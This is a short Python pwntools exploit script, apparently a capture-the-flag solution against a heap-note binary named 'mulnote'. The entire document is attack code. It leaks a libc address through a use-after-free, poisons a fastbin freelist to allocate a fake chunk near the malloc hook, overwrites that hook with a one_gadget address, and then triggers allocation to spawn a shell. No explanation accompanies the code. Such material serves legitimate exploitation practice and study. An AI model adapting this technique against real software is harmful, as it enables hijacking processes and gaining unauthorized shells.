from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./mulnote')
libc = ELF('libc.so')

def Add(size, content):
    p.sendlineafter('>', 'C')
    p.sendlineafter('size>', str(size))
    p.sendafter('note>', content)

def Edit(index, content):
    p.sendlineafter('>', 'E')
    p.sendlineafter('index>', str(index))
    p.sendafter('new note>', content)

def Show():
    p.sendlineafter('>', 'S')

def Delete(index):
    p.sendlineafter('>', 'R')
    p.sendlineafter('index>', str(index))

Add(0x80, 'A'*16)
#gdb.attach(p)
Delete(0)
Show()

p.recvuntil('\n')
libc_base = u64(p.recv(6)+'\x00\x00') - 0x3c4b78
info("libc_base ==> " + hex(libc_base))
one_gadget = libc_base + 0x4526a
info('one_gadget ==> ' + hex(one_gadget))
fake_chunk = libc_base + 0x3c4aed

Add(0x60, 'AAAAAAAA')
Add(0x60, 'BBBBBBBB')
Add(0x60, 'CCCCCCCC')

Delete(3)
Delete(2)

Edit(2, p64(fake_chunk)[0:6])

Add(0x60, 'AAAAAAAA')
Add(0x60, 'A'*0x13 + p64(one_gadget))

p.sendlineafter('>', 'C')
p.sendlineafter('size>', '16')

p.interactive()

